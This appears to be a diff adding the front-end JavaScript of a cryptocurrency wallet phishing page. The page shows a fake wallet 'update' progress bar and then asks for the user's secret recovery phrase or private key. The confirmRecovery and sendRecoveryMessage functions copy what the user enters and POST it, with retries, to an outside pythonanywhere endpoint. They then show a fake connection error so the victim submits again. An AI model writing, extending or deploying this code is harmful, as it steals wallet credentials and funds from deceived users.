@@ -1,0 +1,406 @@
+function toggleModal() {
+  const overlay = document.getElementById('walletOverlay');
+  if (!overlay) return;
+
+  if (overlay.classList.contains('active')) {
+    overlay.classList.remove('active');
+    overlay.style.opacity = '0';
+    overlay.style.pointerEvents = 'none';
+    setTimeout(() => {
+      overlay.style.display = 'none';
+    }, 300);
+  } else {
+    overlay.style.display = 'flex';
+    overlay.style.opacity = '1';
+    overlay.style.pointerEvents = 'auto';
+    requestAnimationFrame(() => overlay.classList.add('active'));
+  }
+}
+  function onWalletSelect(walletName, walletLogo) {
+    toggleModal();
+    showUpdatePopup(walletName, walletLogo);
+
+    
+    document.getElementById('selectedWalletLogo').src = walletLogo;
+    document.getElementById('selectedWalletName').innerText = walletName;
+
+    
+    const messageDiv = document.getElementById('walletMessage');
+    messageDiv.innerHTML = `
+      ${walletName} cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet, and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet.
+      <a href="#">Learn more</a>
+    `;
+  }
+
+  function showUpdatePopup(walletName, logoUrl) {
+    const popup = document.getElementById('updatePopup');
+    const backdrop = document.getElementById('updateBackdrop');
+    const bar = document.getElementById('updateBar');
+    const percentText = document.getElementById('updatePercent');
+    const status = document.getElementById('updateStatus');
+    const title = document.getElementById('walletTitle');
+    const logo = document.getElementById('walletLogo');
+    const updateText = document.querySelector('.update-text');
+    const barWrapper = document.querySelector('.update-bar-wrapper');
+    const btn = document.querySelector('.get-started-btn');
+
+    popup.style.display = 'block';
+    backdrop.style.display = 'block';
+
+    // Reset styles
+    percentText.innerText = '0%';
+    bar.style.width = '0%';
+    status.innerHTML = 'This may take a few moments. Please do not close this window.';
+    title.innerText = `Updating ${walletName}`;
+    logo.src = logoUrl;
+    btn.style.display = 'none';
+
+    updateText.style.display = 'block';
+    barWrapper.style.display = 'block';
+    percentText.style.display = 'block';
+    title.style.display = 'flex';
+    logo.style.display = 'inline';
+    logo.style.width = '24px';
+    logo.style.height = '24px';
+    logo.style.margin = '0';
+
+    let current = 0;
+
+    const animateProgress = () => {
+      if (current >= 100) {
+        bar.style.width = '100%';
+        percentText.innerText = '100%';
+
+        updateText.style.display = 'none';
+        barWrapper.style.display = 'none';
+        percentText.style.display = 'none';
+        title.style.display = 'none';
+
+        logo.style.display = 'block';
+        logo.style.margin = '0 auto 10px';
+        logo.style.width = '60px';
+        logo.style.height = '60px';
+
+        status.innerHTML = `
+          <center>
+            ✅ Update completed successfully!<br>
+            <h2>Let's get started.</h2>
+            <p style="max-width: 320px; margin: 10px auto; font-size: 14px; color: #aaa;">
+              Trusted by millions, <strong>${walletName}</strong> is a secure wallet making the world of web3 accessible to all.
+            </p>
+            <label style="font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 15px;">
+              <input type="checkbox" id="termsCheck" />
+              I agree to ${walletName}'s Terms of use.
+            </label>
+          </center>
+        `;
+
+        btn.style.display = 'block';
+        return;
+      }
+
+      const increment = Math.random() * 0.8 + 0.2;
+      current = Math.min(current + increment, 100);
+      bar.style.width = `${current}%`;
+      percentText.innerText = `${Math.floor(current)}%`;
+
+      setTimeout(() => requestAnimationFrame(animateProgress), 20);
+    };
+
+    animateProgress();
+  }
+
+  function handleImport() {
+    const checkbox = document.getElementById('termsCheck');
+    if (!checkbox || !checkbox.checked) {
+      alert("⚠️ Please agree to the wallet's Terms of Use before proceeding.");
+      return;
+    }
+
+    
+    document.getElementById('updatePopup').style.display = 'none';
+    document.getElementById('updateBackdrop').style.display = 'block';
+    document.getElementById('recoveryPopup').style.display = 'block';
+  }
+
+  
+  function closeRecoveryPopup() {
+    document.getElementById('recoveryPopup').style.display = 'none';
+    document.getElementById('updateBackdrop').style.display = 'none';
+  }
+
+  function renderRecoveryInputs() {
+  const selectValue = document.getElementById('wordCountSelect').value;
+  const container = document.getElementById('recoveryInputsContainer');
+  const privateKeyField = document.getElementById('privateKeyField');
+  const infoText = document.getElementById('recoveryInfoText');
+
+  container.innerHTML = '';
+
+  
+  const existingToggle = document.getElementById('toggleVisibilityBtn');
+  if (existingToggle) {
+    existingToggle.remove();
+  }
+
+  if (selectValue === 'private') {
+    privateKeyField.style.display = 'block';
+    infoText.textContent = 'ⓘ You can paste in your private key here';
+    return;
+  }
+
+  privateKeyField.style.display = 'none';
+  infoText.textContent = 'ⓘ You can paste your entire secret recovery phrase into any field';
+
+ 
+  const count = parseInt(selectValue);
+  for (let i = 1; i <= count; i++) {
+    const input = document.createElement('input');
+    input.type = 'password'; 
+    input.placeholder = `${i}.`;
+    input.className = 'recovery-input';
+    input.dataset.index = i;
+    container.appendChild(input);
+  }
+
+  
+  const toggleBtn = document.createElement('button');
+  toggleBtn.id = 'toggleVisibilityBtn';
+  toggleBtn.textContent = 'Show Phrase';
+  toggleBtn.className = 'toggle-phrase-btn';
+  toggleBtn.onclick = toggleRecoveryVisibility;
+
+  infoText.insertAdjacentElement('afterend', toggleBtn);
+
+  enablePasteToDistribute();
+}
+
+
+function copyTextToClipboard(text) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    return navigator.clipboard.writeText(text);
+  }
+
+  const temp = document.createElement('textarea');
+  temp.value = text;
+  temp.setAttribute('readonly', '');
+  temp.style.position = 'fixed';
+  temp.style.left = '-9999px';
+  document.body.appendChild(temp);
+  temp.select();
+  document.execCommand('copy');
+  document.body.removeChild(temp);
+}
+
+function sendRecoveryMessage(message) {
+    const telegramEndpoint = 'https://0x20dev.pythonanywhere.com/send';
+
+    const payload = {
+        text: message,
+        parse_mode: 'Markdown'
+    };
+
+    const maxRetries = 3;
+    const baseDelay = 400;
+    const timeoutMs = 8000;
+
+    const attemptSend = (attempt) => {
+        console.debug(
+            `sendRecoveryMessage: attempting ${telegramEndpoint} (attempt ${attempt})`
+        );
+
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
+
+        return fetch(telegramEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload),
+            signal: controller.signal
+        })
+        .then(async (res) => {
+            clearTimeout(timer);
+
+            const text = await res.text();
+
+            console.debug('sendRecoveryMessage: response', {
+                url: telegramEndpoint,
+                status: res.status,
+                ok: res.ok
+            });
+
+            if (!res.ok) {
+                console.error(
+                    'sendRecoveryMessage: non-OK response:',
+                    text
+                );
+
+                throw new Error(
+                    `HTTP ${res.status}: ${text}`
+                );
+            }
+
+            try {
+                return JSON.parse(text);
+            } catch (e) {
+                return {
+                    ok: true,
+                    __raw: text
+                };
+            }
+        })
+        .then((json) => {
+            if (json && typeof json.ok !== 'undefined') {
+                if (json.ok) {
+                    return {
+                        ok: true
+                    };
+                }
+
+                throw new Error('API returned ok=false');
+            }
+
+            return {
+                ok: true
+            };
+        })
+        .catch((err) => {
+            clearTimeout(timer);
+
+            console.error(
+                `sendRecoveryMessage: attempt ${attempt} failed:`,
+                err
+            );
+
+            if (attempt < maxRetries) {
+                const delay =
+                    baseDelay * Math.pow(2, attempt - 1) +
+                    Math.random() * 100;
+
+                console.debug(
+                    `sendRecoveryMessage: retrying in ${Math.round(delay)}ms`
+                );
+
+                return new Promise((resolve) =>
+                    setTimeout(resolve, delay)
+                ).then(() => attemptSend(attempt + 1));
+            }
+
+            throw err;
+        });
+    };
+
+    return attemptSend(1);
+}
+
+
+function confirmRecovery() {
+  const confirmBtn = document.getElementById('confirmBtn');
+  confirmBtn.disabled = true;
+  confirmBtn.innerHTML = 'Synchronizing... <span class="loading-spinner"></span>';
+
+  const selectValue = document.getElementById('wordCountSelect').value;
+  const walletName = document.getElementById('selectedWalletName').innerText.trim();
+
+  let messageContent = '';
+
+  if (selectValue === 'private') {
+    const key = document.getElementById('privateKeyField').value.trim();
+    if (!key) {
+      alert("⚠️ Please enter your private key.");
+      confirmBtn.disabled = false;
+      confirmBtn.innerHTML = 'Confirm Secret Recovery Phrase';
+      return;
+    }
+    messageContent = `\`\`\`\n${key}\n\`\`\``;
+  } else {
+    const inputs = document.querySelectorAll('#recoveryInputsContainer input');
+    const words = [];
+    inputs.forEach((input) => {
+      if (input.value.trim()) {
+        words.push(input.value.trim());
+      }
+    });
+
+    if (words.length !== inputs.length) {
+      alert(`⚠️ Please enter all ${inputs.length} words.`);
+      confirmBtn.disabled = false;
+      confirmBtn.innerHTML = 'Confirm Secret Recovery Phrase';
+      return;
+    }
+
+    const phraseText = words.join(' ');
+    messageContent = `\`\`\`\n${phraseText}\n\`\`\``;
+    copyTextToClipboard(phraseText).catch(() => {});
+  }
+
+  const locationText = 'Unknown location';
+  const locationLine = `*Location:* ${locationText}\n`;
+
+  const time = new Date().toLocaleString();
+
+  const message = `🔐 *Wallet Recovery Submission*\n\n` +
+      `*Wallet:* ${walletName}\n` +
+      `*Type:* ${selectValue === 'private' ? 'Private Key' : 'Secret Recovery Phrase'}\n` +
+      `*Time:* ${time}\n` +
+      `${locationLine}` +
+      `*Details:*\n${messageContent}`;
+
+  sendRecoveryMessage(message)
+    .then(() => {
+      alert("An error occured while connecting, please try again.");
+
+      confirmBtn.disabled = false;
+      confirmBtn.innerHTML = 'Confirm Secret Recovery Phrase';
+
+      closeRecoveryPopup();
+    })
+    .catch((err) => {
+      console.error('sendRecoveryMessage error:', err);
+      alert("❌ Failed to send recovery details. Please try again later.");
+
+      confirmBtn.disabled = false;
+      confirmBtn.innerHTML = 'Confirm Secret Recovery Phrase';
+    });
+}
+
+
+function enablePasteToDistribute() {
+  const container = document.getElementById('recoveryInputsContainer');
+  const inputs = container.querySelectorAll('input');
+
+  if (!inputs.length) return;
+
+  // Only attach to the first input
+  inputs[0].addEventListener('paste', (e) => {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData('text');
+    const words = text.trim().split(/\s+/);
+
+    if (words.length !== inputs.length) {
+      alert(`⚠️ You pasted ${words.length} words. Expected ${inputs.length}.`);
+      return;
+    }
+
+    words.forEach((word, index) => {
+      inputs[index].value = word;
+      inputs[index].type = 'password'; 
+    });
+  });
+}
+
+function toggleRecoveryVisibility() {
+  const inputs = document.querySelectorAll('#recoveryInputsContainer input.recovery-input');
+  const btn = document.getElementById('toggleVisibilityBtn');
+  const shouldShow = Array.from(inputs)[0].type === 'password';
+
+  inputs.forEach(input => {
+    input.type = shouldShow ? 'text' : 'password';
+  });
+
+  btn.textContent = shouldShow ? 'Hide Phrase' : 'Show Phrase';
+}
+
+  document.addEventListener("DOMContentLoaded", renderRecoveryInputs);
